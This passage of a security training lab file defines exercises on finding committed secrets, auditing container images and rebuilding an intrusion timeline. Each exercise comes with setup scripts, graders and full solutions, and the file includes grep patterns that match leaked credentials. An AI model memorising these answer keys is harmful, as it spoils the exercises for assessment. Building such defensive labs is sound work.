        ".env": (lambda: "DB_PASSWORD=%s\nDEBUG=false\n" % hx(), lambda: "DB_PASSWORD=changeme\nDEBUG=false\n"),
        "deploy/aws.ini": (lambda: "[default]\naws_access_key_id = %s\nregion = eu-west-1\n" % akia(),
                           lambda: "[default]\naws_access_key_id = AKIA<your-key-id>\nregion = eu-west-1\n"),
        "keys/server.pem": (lambda: pem("PRIVATE KEY"), lambda: pem("PUBLIC KEY")),
        "src/settings.py": (lambda: 'import os\nAPI_TOKEN = "%s"\nDEBUG = False\n' % hx(),
                            lambda: 'import os\nAPI_TOKEN = os.environ["API_TOKEN"]\nDEBUG = False\n'),
        "scripts/deploy.sh": (lambda: "#!/bin/sh\nexport APP_SECRET='%s'\n./run.sh\n" % hx(),
                              lambda: '#!/bin/sh\nexport APP_SECRET="$(cat /run/secrets/app)"\n./run.sh\n'),
        "web/config.json": (lambda: '{"site": "demo", "api_token": "%s"}\n' % hx(),
                            lambda: '{"site": "demo", "api_token": ""}\n'),
        "ci/pipeline.yml": (lambda: "deploy:\n  script: ./ship.sh\n  token: %s\n" % hx(),
                            lambda: "deploy:\n  script: ./ship.sh\n  token: ${{ secrets.CI_TOKEN }}\n"),
        "infra/terraform.tfvars": (lambda: 'region = "eu-west-1"\ndb_password = "%s"\n' % hx(),
                                   lambda: 'region = "eu-west-1"\ndb_password = "<set-me>"\n'),
        "app/notify.conf": (lambda: "smtp_host: mail.internal\nsmtp_secret: %s\n" % hx(),
                            lambda: "smtp_host: mail.internal\nsmtp_secret: example-not-real\n"),
        "keys/deploy_key": (lambda: pem("OPENSSH PRIVATE KEY"),
                            lambda: "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5%s deploy@ci\n" % hx()),
        ".config/service/client.ini": (lambda: "[oauth]\nclient_id = web\nclient_secret = %s\n" % hx(),
                                       lambda: "[oauth]\nclient_id = web\nclient_secret =\n"),
    }
    always_clean = {
        "README.md": "# Demo service\n\nSet your password in the vault and load it at start-up.\n",
        "docs/security.md": "# Security notes\n\nRotate every credential regularly. AWS key IDs start with AKIA and must never be committed.\n",
        "keys/ca.crt": pem("CERTIFICATE"),
        "src/main.py": "import os\n\ndef main():\n    print('hello')\n\nmain()\n",
        "src/util.py": "def add(a, b):\n    return a + b\n",
        "Makefile": "all:\n\techo build\n",
        "tests/test_api.py": "import os\npassword = os.urandom(16).hex()\n",
    }
    leaky = set(random.sample(sorted(slots), random.randint(5, 8)))
    files = dict(always_clean)
    for path, (bad, good) in slots.items():
        files[path] = bad() if path in leaky else good()
    for path, text in files.items():
        p = os.path.join(root, path)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as f:
            f.write(text)
    open("/var/lib/kubelab/answer", "w").write("\n".join(sorted(leaky)) + "\n")
    PY
    chown -R "$(lab_user):" /lab/repo
  check: |
    got=$(sed 's|^\./||; s/[[:space:]]*$//' /lab/leaks.txt 2>/dev/null | grep -v '^$' | LC_ALL=C sort -u)
    check_eq "the leaking files are listed exactly" "$got" "$(LC_ALL=C sort "$KL_STATE/answer")"
  solve: |
    cd /lab/repo
    {
      grep -rIlE 'AKIA[0-9A-Z]{16}' .
      grep -rIlE -e '-----BEGIN [A-Z ]*PRIVATE KEY-----' .
      grep -rIiE "(password|token|secret)['\"]?[[:space:]]*[=:][[:space:]]*['\"]?[A-Za-z0-9/+_-]{8,}" . | grep -viE 'changeme|example' | cut -d: -f1
    } | sed 's|^\./||' | sort -u > /lab/leaks.txt

- id: sec-024
  title: Audit the container images
  difficulty: 3
  kind: build
  tags: [docker, images, audit, compliance]
  tutorial: |
    **Concept.** An image's configuration records the user it runs as, its declared ports, environment and health check. Auditing images before deployment means reading that metadata, without starting a container.

    **Read up on:**
    - `docker image inspect` — full JSON metadata
    - `--format` Go templates — extract one field
    - `jq` — filter and test JSON with `-e`, `select`, `test`
    - The `Config` object — which fields it holds
  scenario: |
    Five images tagged **`kl-audit/*`** were built by different teams. The deployment
    policy says an image must:

    - run as a **non-root** user,
    - define a **health check**,
    - have **no environment variable** whose name contains `PASSWORD`, `SECRET` or `TOKEN`,
    - declare **only port 8080/tcp**.

    Exactly one image meets all four. Write its `name:tag` to **`/lab/answer.txt`**.
    There is no need to run any of them.
  hints:
    - "`docker images 'kl-audit/*'` lists the candidates."
    - "`docker image inspect IMAGE | jq '.[0].Config'` shows every field the policy talks about."
    - "A user of `0`, `root` or an empty string all mean root."
  solution: |
    Test every candidate against all four rules with `jq`:

    ```bash
    for r in $(docker images --format '{{.Repository}}:{{.Tag}}' | grep '^kl-audit/'); do
      docker image inspect "$r" | jq -e '.[0].Config as $c | ($c.User // "") as $u
        | ($u != "" and $u != "root" and $u != "0") and ($c.Healthcheck != null)
        and ((($c.ExposedPorts // {}) | keys) == ["8080/tcp"])
        and ((($c.Env // []) | map(select(test("^[^=]*(PASSWORD|SECRET|TOKEN)"))) | length) == 0)' >/dev/null && echo "$r" || true
    done > /lab/answer.txt
    ```
  setup: |
    words=($(shuf -e alpha bravo charlie delta echo foxtrot golf hotel -n5))
    kinds=($(shuf -e ok root nohc secret port))
    rootuser=$(shuf -e "" root 0 -n1)
    okuser=$(shuf -e nobody 10001 -n1)
    secname=$(shuf -e DB_PASSWORD API_TOKEN APP_SECRET -n1)
    for i in 0 1 2 3 4; do
      ref="kl-audit/${words[$i]}:$((RANDOM % 5 + 1)).$((RANDOM % 9))"
      user=$okuser; extra=""; port="8080"; hc='HEALTHCHECK --interval=30s CMD ["python3","-c","print(1)"]'
      case ${kinds[$i]} in
        ok) echo "$ref" > "$KL_STATE/answer" ;;
        root) user=$rootuser ;;
        nohc) hc="" ;;
        secret) extra="ENV $secname=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')" ;;
        port) port="8080 22" ;;
      esac
      {
        echo "FROM python:3.12-alpine"
        [ -n "$user" ] && echo "USER $user"
        echo "ENV APP_MODE=prod"
        [ -n "$extra" ] && echo "$extra"
        echo "EXPOSE $port"
        [ -n "$hc" ] && echo "$hc"
        echo 'CMD ["python3","-m","http.server","8080"]'
      } | docker build -q -t "$ref" - >/dev/null
      on_reset "docker rmi -f '$ref' >/dev/null 2>&1"
    done
  check: |
    check_eq "compliant image named in /lab/answer.txt" "$(tr -d '[:space:]' 2>/dev/null </lab/answer.txt)" "$(cat "$KL_STATE/answer")"
  solve: |
    for r in $(docker images --format '{{.Repository}}:{{.Tag}}' | grep '^kl-audit/'); do
      docker image inspect "$r" | jq -e '.[0].Config as $c | ($c.User // "") as $u | ($u != "" and $u != "root" and $u != "0") and ($c.Healthcheck != null) and ((($c.ExposedPorts // {}) | keys) == ["8080/tcp"]) and ((($c.Env // []) | map(select(test("^[^=]*(PASSWORD|SECRET|TOKEN)"))) | length) == 0)' >/dev/null && echo "$r" || true
    done > /lab/answer.txt

- id: sec-025
  title: Rebuild the intrusion timeline
  difficulty: 5
  kind: build
  tags: [forensics, timeline, logs, incident]
  tutorial: |
    **Concept.** Each log source has its own timestamp format and sometimes its own time zone. A timeline needs every entry converted to one reference time, then merged. Plain substring matching on an address also pulls in lookalikes.

    **Read up on:**
    - Syslog, web-server and JSON timestamps — where the time sits
    - `grep -w` or anchored regex — whole-address matching
    - `date -u -d` or Python `datetime` — shift between zones
    - `sort` — order merged lines
  scenario: |
    The gateway was compromised. Evidence is in **`/lab/evidence`**:

    - `alert.txt` — the attacker's IP address,
    - `auth.log` — syslog format, recorded in **server local time (UTC+2)**,
    - `access.log` — web server log, in **UTC**,
    - `audit.jsonl` — one JSON event per line, in **UTC**.

    Build the attacker's timeline in **`/lab/timeline.txt`**: one line for **every
    entry in these three files that mentions that address**, oldest first, written as

    ```
    HH:MM:SS file
    ```

    with the time in **UTC** and `file` the name of the file the entry came from
    (`auth.log`, `access.log` or `audit.jsonl`). All events happened on the same day.
  hints:
    - "Only the time of day matters. Work out where the time sits in each of the three formats."
    - "Other addresses in the logs start with the same digits; make sure you match the whole address."
    - "Convert to UTC before sorting: the auth log is two hours ahead of the other files."
  solution: |
    Extract the time from each format, shift the auth log back two hours, merge, and sort. A short Python script is the clearest way:

    ```python
    import re
    ip = open('/lab/evidence/alert.txt').read().strip()
    w = re.compile(r'(?<![\d.])' + re.escape(ip) + r'(?![\d.])')
    ev = []
    for line in open('/lab/evidence/auth.log'):
        if w.search(line):
            h, m, s = map(int, line.split()[2].split(':'))
            ev.append(((h - 2) * 3600 + m * 60 + s, 'auth.log'))
    for name, pat in (('access.log', r'\[\d+/\w+/\d+:(\d+):(\d+):(\d+)'), ('audit.jsonl', r'T(\d+):(\d+):(\d+)Z')):
        for line in open('/lab/evidence/' + name):
            if w.search(line):
                h, m, s = map(int, re.search(pat, line).groups())
                ev.append((h * 3600 + m * 60 + s, name))
    ev.sort()
    with open('/lab/timeline.txt', 'w') as f:
        for t, n in ev:
            f.write('%02d:%02d:%02d %s\n' % (t // 3600, t // 60 % 60, t % 60, n))
    ```
  setup: |
    python3 - <<'PY'
    import random, json, os
    n = random.randint(2, 9)
    ip = "203.0.113.%d" % n
    decoys = ["203.0.113.%d0" % n, "203.0.113.%d%d" % (n, n)]
    others = ["198.51.100.%d" % i for i in random.sample(range(2, 250), 12)]
    lo, hi = 12 * 3600, 18 * 3600
    atimes = sorted(random.sample(range(lo, hi), 10))
    labels = ["auth.log"] * 3 + ["access.log"] * 4 + ["audit.jsonl"] * 3
    random.shuffle(labels)
    ev = {"auth.log": [], "access.log": [], "audit.jsonl": []}
    exp = []
    def hms(t):
        return "%02d:%02d:%02d" % (t // 3600, t // 60 % 60, t % 60)
    def mk(name, t, who):
        if name == "auth.log":
            msg = random.choice(["Failed password for root", "Invalid user admin", "Accepted password for deploy",
                                 "Failed password for invalid user test"])
            lt = t + 7200
            return "Nov  8 %s gw sshd[%d]: %s from %s port %d ssh2\n" % (
                hms(lt), random.randint(1000, 30000), msg, who, random.randint(20000, 60000))
        if name == "access.log":
            return '%s - - [08/Nov/2025:%s +0000] "GET %s HTTP/1.1" %d %d "-" "curl/8.5.0"\n' % (
                who, hms(t), random.choice(["/login", "/admin", "/export", "/api/users"]),
                random.choice([200, 302, 401, 404]), random.randint(100, 9000))
        return json.dumps({"ts": "2025-11-08T%sZ" % hms(t), "src": who,
                           "action": random.choice(["login", "sudo", "file_read", "scp"]),
                           "user": random.choice(["deploy", "root", "backup"])}) + "\n"
    for t, name in zip(atimes, labels):
        ev[name].append((t, mk(name, t, ip)))
        exp.append("%s %s" % (hms(t), name))
    for name in ev:
        fixed = list(ev[name])
        for _ in range(35):
            t = random.randint(lo, hi)
            fixed.append((t, mk(name, t, random.choice(others + decoys))))
        for d in decoys:
            t = random.randint(lo, hi)
            fixed.append((t, mk(name, t, d)))
        fixed.sort(key=lambda x: x[0])
        ev[name] = fixed
    os.makedirs("/lab/evidence", exist_ok=True)
    for name, rows in ev.items():
        with open("/lab/evidence/" + name, "w") as f:
            f.write("".join(l for _, l in rows))
    open("/lab/evidence/alert.txt", "w").write(ip + "\n")
    open("/var/lib/kubelab/answer", "w").write("\n".join(exp) + "\n")
    PY
    chown -R "$(lab_user):" /lab/evidence
  check: |
    got=$(sed 's/[[:space:]]*$//' /lab/timeline.txt 2>/dev/null | grep -v '^$')
    check_eq "timeline matches the evidence, in UTC order" "$got" "$(cat "$KL_STATE/answer")"
  solve: |
    python3 - <<'PY'
    import re
    ip = open('/lab/evidence/alert.txt').read().strip()
    w = re.compile(r'(?<![\d.])' + re.escape(ip) + r'(?![\d.])')
    ev = []
    for line in open('/lab/evidence/auth.log'):
        if w.search(line):
            h, m, s = map(int, line.split()[2].split(':'))
            ev.append(((h - 2) * 3600 + m * 60 + s, 'auth.log'))
    for name, pat in (('access.log', r'\[\d+/\w+/\d+:(\d+):(\d+):(\d+)'), ('audit.jsonl', r'T(\d+):(\d+):(\d+)Z')):
        for line in open('/lab/evidence/' + name):
            if w.search(line):
                h, m, s = map(int, re.search(pat, line).groups())
                ev.append((h * 3600 + m * 60 + s, name))
    ev.sort()
    with open('/lab/timeline.txt', 'w') as f:
        for t, n in ev:
            f.write('%02d:%02d:%02d %s\n' % (t // 3600, t // 60 % 60, t % 60, n))
    PY
